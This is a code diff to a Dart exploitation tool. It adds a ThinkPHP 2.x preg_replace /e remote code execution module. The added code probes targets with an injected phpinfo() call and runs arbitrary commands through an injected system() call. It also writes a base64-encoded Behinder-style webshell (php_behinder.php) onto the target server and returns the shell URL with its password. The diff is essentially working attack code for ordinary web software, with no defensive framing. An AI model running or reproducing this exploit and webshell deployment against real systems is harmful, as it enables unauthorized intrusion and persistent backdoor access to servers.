@@ -167,6 +167,23 @@ class ThinkphpExpService {
     return ThinkphpResult(false, 'ThinkPHP 3.x Log RCE', '');
   }
 
+  /// 11. ThinkPHP 2.x preg_replace /e 修饰符 RCE
+  Future<ThinkphpResult> checkTp2() async {
+    final urls = [
+      '${baseUri}index.php?s=/index/index/name/\${@phpinfo()}',
+      '$baseUri?s=/index/index/name/\${@phpinfo()}',
+    ];
+    for (final u in urls) {
+      try {
+        final res = await http.get(Uri.parse(u)).timeout(timeout);
+        if (res.body.contains(_phpVersionCheck)) {
+          return ThinkphpResult(true, 'ThinkPHP 2.x RCE', u);
+        }
+      } catch (_) {}
+    }
+    return ThinkphpResult(false, 'ThinkPHP 2.x RCE', '');
+  }
+
   /// 12. ThinkPHP 5.0.23 完整版 debug 模式（无需 captcha）
   Future<ThinkphpResult> checkTp5023Debug() => _v5.checkTp5023Debug();
 
@@ -253,6 +270,8 @@ class ThinkphpExpService {
         return checkTp3LogRce();
       case ThinkphpVulnType.tp6Log:
         return checkTp6Log();
+      case ThinkphpVulnType.tp2:
+        return checkTp2();
     }
   }
 
@@ -268,6 +287,7 @@ class ThinkphpExpService {
   /// 检测全部 RCE 漏洞
   Future<List<ThinkphpResult>> checkAllRce() async {
     return checkMultiple([
+      ThinkphpVulnType.tp2,
       ThinkphpVulnType.tp50,
       ThinkphpVulnType.tp5010,
       ThinkphpVulnType.tp5022_5129,
@@ -294,6 +314,19 @@ class ThinkphpExpService {
   /// 执行命令（需先通过 check 确定漏洞类型）
   Future<String?> exeRce(ThinkphpVulnType type, String cmd) async {
     switch (type) {
+      case ThinkphpVulnType.tp2:
+        final urls = [
+          '${baseUri}index.php?s=/index/index/name/\${@system(\'$cmd\')}',
+          '$baseUri?s=/index/index/name/\${@system(\'$cmd\')}',
+        ];
+        for (final u in urls) {
+          try {
+            final res = await http.get(Uri.parse(u)).timeout(timeout);
+            final out = _extractBeforeHtml(res.body);
+            if (out.isNotEmpty) return out;
+          } catch (_) {}
+        }
+        return null;
       case ThinkphpVulnType.tp50:
       case ThinkphpVulnType.tp5010:
       case ThinkphpVulnType.tp5022_5129:
@@ -348,6 +381,22 @@ class ThinkphpExpService {
     String password = AppConstants.defaultShellPassword,
   }) async {
     switch (type) {
+      case ThinkphpVulnType.tp2:
+        const shellFile = 'php_behinder.php';
+        final shellB64 = base64.encode(utf8.encode(shellContent));
+        final writeCmd = Uri.encodeComponent("echo '$shellB64'|base64 -d>$shellFile");
+        final writeUrls = [
+          '${baseUri}index.php?s=/index/index/name/\${@system(\'$writeCmd\')}',
+          '$baseUri?s=/index/index/name/\${@system(\'$writeCmd\')}',
+        ];
+        for (final u in writeUrls) {
+          try {
+            await http.get(Uri.parse(u)).timeout(timeout);
+          } catch (_) {}
+        }
+        final check2 = await http.get(Uri.parse('$baseUri$shellFile')).timeout(timeout);
+        if (check2.statusCode == 200) return '$baseUri$shellFile Pass:$password';
+        return null;
       case ThinkphpVulnType.tp50:
       case ThinkphpVulnType.tp5010:
       case ThinkphpVulnType.tp5022_5129:
@@ -422,6 +471,7 @@ class ThinkphpExpService {
 }
 
 enum ThinkphpVulnType {
+  tp2,
   tp50,
   tp5010,
   tp5022_5129,
@@ -445,6 +495,8 @@ enum ThinkphpVulnType {
 extension ThinkphpVulnTypeExt on ThinkphpVulnType {
   String get label {
     switch (this) {
+      case ThinkphpVulnType.tp2:
+        return 'ThinkPHP 2.x · preg_replace /e RCE';
       case ThinkphpVulnType.tp50:
         return 'ThinkPHP CVE-2018-20062 · 5.0 invokefunction RCE';
       case ThinkphpVulnType.tp5010:
@@ -487,6 +539,7 @@ extension ThinkphpVulnTypeExt on ThinkphpVulnType {
 
   bool get supportsRce {
     switch (this) {
+      case ThinkphpVulnType.tp2:
       case ThinkphpVulnType.tp50:
       case ThinkphpVulnType.tp5010:
       case ThinkphpVulnType.tp5022_5129:
